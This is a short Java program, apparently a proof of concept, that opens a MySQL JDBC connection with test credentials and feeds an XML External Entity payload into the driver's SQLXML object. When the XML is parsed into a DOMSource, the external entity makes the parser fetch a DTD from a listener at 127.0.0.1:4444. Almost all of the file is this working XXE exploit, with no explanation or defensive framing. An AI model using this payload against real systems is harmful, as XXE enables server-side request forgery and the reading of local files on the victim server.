import javax.xml.transform.dom.DOMSource;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.SQLXML;


public class Test {

    public static void main(String[] args) throws SQLException {
        String db_ip = "127.0.0.1";
        String db_port = "3306";
        String db_name = "test";
        String db_user = "test";
        String db_pass = "test";

        String url = "jdbc:mysql://"+db_ip+":"+db_port+"/"+db_name+"";
        String xxe = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "<!ELEMENT foo ANY >\n" +
                "<!ENTITY xxe SYSTEM \"http://127.0.0.1:4444/test.dtd\" >\n" +
                "]>\n" +
                "<foo>&xxe;</foo>";

        Connection con = DriverManager.getConnection(url, db_user, db_pass);
        SQLXML sqlxml = con.createSQLXML();
        sqlxml.setString(xxe);
        sqlxml.getSource(new DOMSource().getClass());
    }
}
